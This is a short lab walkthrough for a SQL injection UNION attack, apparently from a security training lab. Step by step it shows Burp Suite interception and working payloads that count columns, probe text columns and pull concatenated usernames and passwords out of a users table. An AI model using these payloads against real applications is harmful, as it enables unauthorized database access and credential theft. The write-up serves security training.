# Lab: SQL Injection UNION Attack - Retrieving Multiple Values in a Single Column

## Steps to Solve the Lab:

1. **Intercept the Request**  
   - Use Burp Suite to intercept and modify the request that sets the product category filter.

2. **Determine the Number of Columns**  
   - Identify how many columns are returned by the query using:  
     ```sql
     '+UNION+SELECT+NULL,NULL--
     ```
   - Adjust the number of `NULL` values until the query executes without an error.

3. **Identify Columns Containing Text Data**  
   - Test which columns accept text by modifying the query:  
     ```sql
     '+UNION+SELECT+NULL,'abc'--
     ```
   - If an error occurs, adjust the column where `'abc'` is placed.

4. **Retrieve Multiple Values in a Single Column**  
   - Use string concatenation (`||`) to combine `username` and `password` into a single column:  
     ```sql
     '+UNION+SELECT+NULL,username||'~'||password+FROM+users--
     ```
   - The `~` character is used as a separator.

5. **Verify Output**  
   - Check the application's response for concatenated usernames and passwords.

## Expected Outcome:
- The response should display usernames and passwords separated by `~` in the identified text-based column.
